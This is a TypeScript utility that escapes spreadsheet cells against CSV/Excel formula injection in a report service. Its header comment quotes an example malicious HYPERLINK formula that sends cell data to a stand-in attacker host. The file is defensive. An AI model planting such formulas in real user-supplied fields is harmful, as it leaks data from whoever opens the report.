/**
 * v0.47 PR4 — CSV/Excel injection defense on xlsx output.
 *
 * Excel evaluates cell content starting with =, +, -, @, \t, \r as a formula.
 * A malicious senderName like `=HYPERLINK("https://attacker.example/?leak="&A1,"Click")`
 * would exfil data when the recipient opens the report. Prefix `'` neutralizes
 * the formula trigger — Excel displays the literal content.
 *
 * Used by PhuLucReportService before writing every user-controlled string cell.
 */

const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

export function escapeXlsxCell<T>(value: T): T {
  if (value === null || value === undefined) return value;
  if (typeof value !== 'string') return value;
  if (FORMULA_TRIGGERS.test(value)) {
    // Already-prefixed strings won't match (first char is now `'`).
    return ("'" + value) as unknown as T;
  }
  return value;
}

export function escapeXlsxRow<T extends Record<string, unknown>>(row: T): T {
  const out: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(row)) {
    out[k] = escapeXlsxCell(v);
  }
  return out as T;
}
